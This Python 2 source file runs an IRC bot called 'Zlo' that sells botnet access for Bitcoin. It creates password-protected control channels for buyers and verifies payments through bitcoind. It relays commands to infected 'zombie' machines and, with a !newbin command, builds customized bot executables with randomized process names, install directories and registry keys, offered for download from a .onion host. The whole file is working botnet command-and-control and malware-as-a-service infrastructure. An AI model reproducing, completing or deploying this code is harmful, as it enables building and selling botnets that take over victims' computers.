import socket, urllib, random, thread, time, string, os, pythoncom, wmi, datetime, bitcoinrpc, intelhashing #have a console, ability to refresh channels, etc.
#from jsonrpc import ServiceProxy

rpc_user = "bitcoinrpc"
rpc_password = "rpcpasswordhere..."
conn = bitcoinrpc.connect_to_remote(rpc_user, rpc_password, host='localhost', port=8332, use_https=False)
#from jsonrpc.proxy import JSONRPCProxy
#conn = JSONRPCProxy.from_url("http://"+rpc_user+":"+rpc_password+"@127.0.0.1:8332")
#conn = ServiceProxy("http://"+rpc_user+":"+rpc_password+"@127.0.0.1:8332")
#conn = bitcoinrpc.connect_to_local(filename="C:\Users\Administrator\AppData\Roaming\Bitcoin\bitcoin.conf")

#def removeOldPurchases():
#    while 1:
#        purchases = urllib.urlopen("btcpurchases.txt").read().split()
#        for purchase in purchases:
#            date = purchase.split("|")[0]

def NumberProcsOpen(ProcName):
    procs=0
    pythoncom.CoInitialize()
    c = wmi.WMI()
    for process in c.Win32_Process():
        try:
            if ProcName in process.Name:
                procs=procs+1
        except:
            pass
    return procs
channelCost = "0.7"

servers = [ "127.0.0.1" ]
#useTor=True
useTor=False

ircNick = "Zlo"
ircPassword = "RUSSIA!@#$RUSSIA!@#$RUSSIA!@#$RUSSIA!@#$"
ircVhost = "Zlo"
channels = urllib.urlopen("channels.txt").read().split()

def detectPayments(conn):
    global channels
    while 1:
        time.sleep(1)
        paymentsWaiting = urllib.urlopen("btcpurchases.txt").read().split()
        for WP in paymentsWaiting:
            if not WP == "" and "|" in WP:
                purchaseTime = WP.split("|")[0]
                bitcoinAddress = WP.split("|")[1]
                newchannel = WP.split("|")[2]
                channelpassword = WP.split("|")[3]
                authpassword = WP.split("|")[4]
                botmainprocess = WP.split("|")[5]
                botdaemonprocess = WP.split("|")[6]
                installdir = WP.split("|")[7]
                regkeyname = WP.split("|")[8]
                timeNow = datetime.datetime.now()
                timeThen = datetime.datetime.strptime(purchaseTime, "%Y-%m-%d_%H:%M")
                timeThen24h = timeThen + datetime.timedelta(hours=24)
                if timeNow > timeThen24h: #payment expired
                    f = open("btcpurchases.txt", "w")
                    for line in paymentsWaiting:
                        if not line == WP:
                            f.write("\n"+line)
                    f.close()
                else:
                    try:
                        if conn.getreceivedbyaddress(bitcoinAddress) >= float(channelCost):
                            f = open("channels.txt", "a")
                            f.write("\n"+newchannel+"|"+channelpassword+"|"+authpassword+"|"+botmainprocess+"|"+botdaemonprocess+"|"+installdir+"|"+regkeyname+"|"+bitcoinAddress+"|"+purchaseTime)
                            f.close()
                            f = open("btcpurchases.txt", "w")
                            for line in paymentsWaiting:
                                if not line == WP:
                                    f.write("\n"+WP)
                            f.close()
                    except:
                        pass
thread.start_new_thread(detectPayments, (conn,)) #for handling payments made, expired, etc.

def updateChannels():
    global channels
    while 1:
        time.sleep(60)
        channels = urllib.urlopen("channels.txt").read().split()

thread.start_new_thread(updateChannels, ()) #responsible for updating the list of channels, especially for when a channel is activated.

def handlePing(text,s):
    if "PING :" in text and not 'PRIVMSG' in text:
        print "received PING: "+text.split(":")[1]
        s.send("PONG :"+text.split(":")[1]+"\n")
        print "sent PONG: "+text.split(":")[1]

def generate_password():
    password = ""
    for x in range(0,random.randrange(7,12)):
        password = password + random.choice(string.letters+string.digits)
    return password

def sendmsg(channel, s, message):
    time.sleep(0.5)
    s.send("PRIVMSG "+channel+" :"+message+"\r\n")

def handleCommands(r, s, output):
    globals channels
    globals conn
    a = r.split(" ")[3].split(":")[1]
    if a.startswith("!help"):
        print "Handling HELP command for user: "+output+"..."
        sendmsg(output, s, "http://f4eqxs3tyrkba7f2.onion/irchelp/help.txt")
    elif a.startswith("!commands"):
        print "Handling COMMANDS command."
        sendmsg(output, s, "http://f4eqxs3tyrkba7f2.onion/irchelp/commands.txt")
        sendmsg(output, s, "For the zombie commands, go to http://f4eqxs3tyrkba7f2.onion/commands.txt")
    elif a.startswith("!cmd"):
        print 'user is running a channel-wide command through Zlo.'
        authPassword=""
        try:
            authPassword = r.split(" ")[4]
        except:
            pass
        command = ""
        if not authPassword == "":
            for channel in channels:
                if not channel == "":
                    if intelhashing.compare(authPassword, channel.split("|")[2]):
                        worked=True
                        print 'user authed for channel-wide command.'
                        x=0
                        while 1:
                            x=x+1
                            worked=False
                            if x > 4:
                                if not command == "":
                                    try:
                                        command = command + " " + r.split(" ")[x]
                                        worked=True
                                    except:
                                        pass
                                else:
                                    try:
                                        command = command + r.split(" ")[x]
                                        worked=True
                                    except:
                                        pass
                                if worked == False:
                                    break
                        command=command.rstrip('\n').rstrip('\r')
                        if not command == "":
                            sendmsg(channel.split("|")[0], s, command)
                            print "command ran."
                            sendmsg(output, s, "command: " + command + " ran successfully.")
                        else:
                            print 'command empty.'
                            sendmsg(output, s, "You must specify the command you'd like to run.")
                            command = "x"
        else:
            sendmsg(output, s, "Remember to enter your password.")
            worked=True
            command = "x"
            print "user: "+output+" forgot to enter his password."
        if command == "":
            sendmsg(output, s, "Password invalid.")
            print "user: "+output+" entered an invalid password for running a bot command."
    elif a.startswith("!logout"):
        print "user is logging out..."
        authPassword=""
        try:
            authPassword=r.split(" ")[4]
        except:
            pass
        if not authPassword == "":
            for channel in channels:
                if not channel == "":
                    print 'trying password: '+authPassword+' against: '+channel.split("|")[2]
                    if intelhashing.compare(authPassword, channel.split("|")[2]):
                        print "logging user out..."
                        sendmsg(channel.split("|")[0], s, "!logout")
                        print 'user was logged out.'
                        sendmsg(output, s, "You were logged out.")
        else:
            sendmsg(output, s, "Remember to input your auth password.")
            print "user didn't enter a password to logout: "+output
    elif a.startswith("!buy"):
        print '!! user is purchasing !!'
        sendmsg(output, s, "Creating login...")
        print 'creating user login.'
        print 'setting channel...'
        newchannel = "#"
        while 1:
            for x in range(0,7):
                newchannel = newchannel + random.choice(string.letters+string.digits)
            if not newchannel in urllib.urlopen("channels.txt").read():
                break
            else:
                newchannel = "#"
        print 'channel set.'
        print 'setting channel password...'
        channelpassword=generate_password()
        print 'password set.'
        authpassword=""
        print 'creating auth password...'
        while 1:
            authpassword=generate_password()
            goodpassword=True
            for channel in channels:
                if not channel == "" and "|" in channel:
                    try:
                        if channel.split("|")[2] == authpassword:
                            goodpassword=False
                    except:
                        pass
            for channel in urllib.urlopen("btcpurchases.txt").read().split():
                if not channel == "" and "|" in channel:
                    try:
                        if intelhashing.compare(authPassword, channel.split("|")[4]):
                            goodpassword=False
                    except:
                        pass
            if goodpassword == True:
                break
        print 'password set.'
        print 'creating the rest of the passwords...'
        botmainprocess = generate_password()+".exe"
        botdaemonprocess = generate_password()+".exe"
        installdir = generate_password()
        regkeyname = generate_password()
        print 'passwords set.'
        currentTime=datetime.datetime.now().strftime("%Y-%m-%d_%H:%M")
        bitcoinAddress = conn.getnewaddress()
        f = open("btcpurchases.txt", "a")
        f.write("\n"+currentTime+"|"+bitcoinAddress+"|"+newchannel+"|"+channelpassword+"|"+intelhashing.encrypt(authpassword)+"|"+botmainprocess+"|"+botdaemonprocess+"|"+installdir+"|"+regkeyname)
        f.close()
        sendmsg(output, s, "Your account details are [channel: "+newchannel+" channel password "+channelpassword+" auth password: "+authpassword+"]")
        sendmsg(output, s, "In order to activate your account, you must send "+channelCost+" BTC or more to the follwing address: "+bitcoinAddress+" - cleaned coins and multi-payment transactions are okay, just make sure to pay in full within 24 hours. Your account will not be activated until the Bitcoin transaction has 3 confirmations. It may take a short time for our system to recognize this, as well. To join a password-protected IRC channel, type /join #channel password")
#        channels = urllib.urlopen("channels.txt").read().split()
#        s.send("JOIN "+newchannel+"\r\n")
#        s.send("MODE "+newchannel+" +k "+channelpassword+"\r\n")
#        print 'user created.'
#        for x in range(0,3):
#            sendmsg(output, s, "User created. WRITE DOWN THE FOLLOWING!: auth password: "+authpassword+" channel password: "+channelpassword+" channel: "+newchannel)
    elif a.startswith("!newbin"):
        print "creating new binary..." #give user file md5 sum
        sendmsg(output, s, "Creating new binary...")
        authPassword=""
        try:
            authPassword=r.split(" ")[4]
        except:
            pass
        botmainprocess=""
        botdaemonprocess=""
        newchannel=""
        channelpassword=""
        regkeyname=""
        installdir=""
        laworked=False
        if not authPassword == "":
            for channel in channels:
                if not channel == "" and "|" in channel:
                    print "trying "+authPassword+" against "+channel.split("|")[2]
                    if intelhashing.compare(authPassword, channel.split("|")[2]):
                        if not NumberProcsOpen("pyinstaller.exe") > 5 and not NumberProcsOpen("python.exe") > 7:
                            newchannel=channel.split("|")[0]
                            channelpassword=channel.split("|")[1]
                            botmainprocess=channel.split("|")[3]
                            botdaemonprocess=channel.split("|")[4]
                            installdir=channel.split("|")[5]
                            regkeyname=channel.split("|")[6]
                            outputfile=""
                            while 1:
                                outputfile=""
                                for x in range(0,random.randrange(5,12)):
                                    outputfile = outputfile + random.choice(string.letters+string.digits)
                                print "output file will be: "+outputfile+".exe..."
                                outputfile = outputfile + ".exe"
                                if not os.path.isfile("\\Python27\\Scripts\\dist\\"+outputfile):
                                    print "running build command..."
                                    os.chdir("\\python27\\scripts")
                                    print "command: chp.exe \\python27\\python.exe compileZIB.py "+botmainprocess+" "+botdaemonprocess+" "+newchannel+" "+channelpassword+" "+regkeyname+" "+installdir+" "+outputfile
                                    os.system("chp.exe \\python27\\python.exe compileZIB.py "+botmainprocess+" "+botdaemonprocess+" "+newchannel+" "+channelpassword+" "+regkeyname+" "+installdir+" "+outputfile)
                                    print "build command ran."
                                    sendmsg(output,s,"Your file should be avaliable at: http://zpsbcbp3hz7syjmt.onion:80/"+outputfile+" within a minute, or two. After 3 minutes, it will be deleted.")
                                    sendmsg(output, s, "NOTICE: Make sure to test new binaries before spreading them, or updating them on your bots. Always use MD5 verification before using bots' update function. If you get a dead binary, re-build. If that doesn't work, get in contact with us ASAP.")
                                    laworked=True
                                    print 'binary: '+outputfile+' created for user: '+output
                                    break
                        else:
                            print "Error: Maximum number of binary builds running (5). user tried to create a new one: "+output
                            sendmsg(output, s, "The maximum number of concurrent binary builds has reached its peak. Please try again later. If you're found abusing this function, your license will be permanently terminated without notice. Please try again in ten minutes.")
                    if laworked == True:
                        break
        else:
            print 'user entered no password.'
            sendmsg(output, s, "No password specified. Unable to build binary.")
            laworked=True
        if laworked == False:
            sendmsg(output, s, "Invalid main authentication password entered. Unable to build binary.")
            print "user: "+output+" entered the wrong password."
    elif a.startswith("!recoverpassword"):
        authPassword = ""
        try:
            authPassword=r.split(" ")[4]
            print "authentication password recovery input: "+authPassword+" by user: "+output
        except:
            pass
        authSuccess=False
        if not authPassword == "":
            for channel in channels:
                if not channel == "" and "|" in channel:
                    if intelhashing.compare(authPassword, channel.split("|")[2]):
                        authSuccess=True
                        print "Password recovery authentication successful! Password: " + authPassword + " recovered password: "+channel.split("|")[1]+" channel: "+channel.split("|")[0]
                        sendmsg(output, s, "Password recovery successful! Recovered channel password: "+channel.split("|")[1]+" channel: "+channel.split("|")[0])

        else:
            sendmsg(output, s, "You failed to input your main authentication password.")
            print "Authentication password recovery auth failed due to no password."
            authSuccess=True
        if authSuccess == False:
            sendmsg(output, s, "Channel password recovery failed! Invalid password.")
            print "Password recovery auth failed. password: " + authPassword
    elif a.startswith("!auth"):
        authPassword = ""
        print "Handling AUTH command."
        worked=False
        try:
            authPassword = r.split(" ")[4]
            print "Authentication password: "+authPassword
            worked = True
        except:
            pass
        authworked=False
        if worked == True:
            for channel in channels:
                if not channel == "" and "|" in channel:
                    print "testing password: "+channel.split("|")[2]+" against: "+authPassword+"."
                    if intelhashing.compare(authPassword, channel.split("|")[2]):
                        sendmsg(channel.split("|")[0], s, "!login "+output)
                        authworked=True
                        sendmsg(output, s, "You have been successfully authenticated. Join the channel "+channel.split("|")[0]+", in order to control your bots. Make sure to run the !logout command in your channel as an authenticated user to logout all pre-existing log-ins, so nobody can change their nick-name to yours and control your bots. This is unlikely to happen, unless a user has stolen your channel password. To join a passworded IRC channel, type /join #channel password")
                        print "Authentication successful!"
        if authworked == False:
            sendmsg(output, s, "Authentication failed. Commands are case-sensitive.")
            print "Authentication failed."
def connect_all_channels(s):
    global channels
    while 1:
        for channel in channels:
            if not channel == "" and "|" in channel:
                time.sleep(0.5)
                s.send("JOIN "+channel.split("|")[0]+" "+channel.split("|")[1]+"\r\n")
                s.send("MODE "+channel.split("|")[0]+" +k "+channel.split("|")[1]+"\r\n")
        time.sleep(60)
def irc(servers):
    global conn
    global channels
    outputChannel = "" #Or user, wherever we need to output to.
    while 1:
        for server in servers:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 #               if useTor == True:
 #                   s.setproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
                print server
                s.settimeout(120)
                s.connect((server, 6667))
                print "connected!"
                print "setting USER: "+ircNick
                s.send("USER "+ircNick+" "+ircNick+" "+ircNick+" : "+ircNick+"\r\n")
                print "setting NICK: "+ircNick
                s.send("NICK "+ircNick+"\r\n")
                r = s.recv(200).rstrip()
                print "r: "+r
                #print "grabbed 3rd r. text: "+r
                handlePing(r, s)
                s.send("OPER "+ircNick+" "+ircPassword+"\r\n")
                s.send("SETHOST "+ircNick+" "+ircVhost+"\r\n")
                thread.start_new_thread(connect_all_channels, (s,))
                s.send("NOTICE Zlo-bot is back online!\r\n")
                while 1:
                    try:
                        outputChannel = r.split(" ")[0].split(":")[1].split("!")[0]
                    except:
                        pass
#                    print outputChannel
                    if not outputChannel == "Zlo" and not outputChannel == "" and "PRIVMSG" in r:
                        try:
                            if not r.split(" ")[2].startswith("#"):
                                print "handling commands..."
                                print "user who sent command: "+outputChannel
                                handleCommands(r, s, outputChannel)
                                #while 1:
                                #    hehworked=False
                                #    try:
                                #        thread.start_new_thread(handleCommands, (r, s, outputChannel))
                                #        hehworked=True
                                #    except:
                                #        pass
                                #    if hehworked == True:
                                #        break
                        except Exception as ex:
                            print ex
                            pass
                    r=""
                    outputChannel=""
                    #s.send("VIVA LA REVOLUTION\n")
                    worked=False
                    try:
                        worked=True
                        r = s.recv(200).rstrip()
                        #print "r: "+r
                        handlePing(r, s)
                    except:
                        pass
                    if worked == False:
                        break
                s.close()
            except Exception as ex:
                print ex
                pass #change to pass!!!!!!!!!!!!!!!!!!!!!!!!!!
irc(servers)

